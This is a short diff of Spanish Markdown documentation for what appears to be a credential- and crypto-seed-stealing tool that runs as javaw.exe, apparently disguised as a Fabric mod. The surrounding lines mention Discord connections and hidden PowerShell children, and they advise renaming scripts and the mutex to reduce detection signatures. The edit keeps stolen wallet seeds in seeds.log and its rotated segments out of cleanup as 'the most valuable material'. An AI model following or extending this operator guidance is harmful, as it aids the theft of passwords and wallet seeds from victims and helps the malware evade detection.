@@ -201,8 +201,8 @@ a `discord.com:443`/`gateway.discord.gg:443` desde `javaw.exe`.
     `Local\FabricSync*` y por los `powershell` hijos con `-WindowStyle Hidden`;
     renombrar scripts/mutex a algo genérico reduciría la firma. También conviene
     poner TTL a `passwords.log`/`keys.log`/`seeds.log` y cifrarlos si el disco es
-   compartido. `seeds.log` queda fuera de la limpieza de 7 días por ser el
-   material más valioso.
+   compartido. `seeds.log` y sus segmentos rotados quedan fuera de la limpieza
+   de 7 días por ser el material más valioso.
 
 ## 13. Desinstalación limpia
 
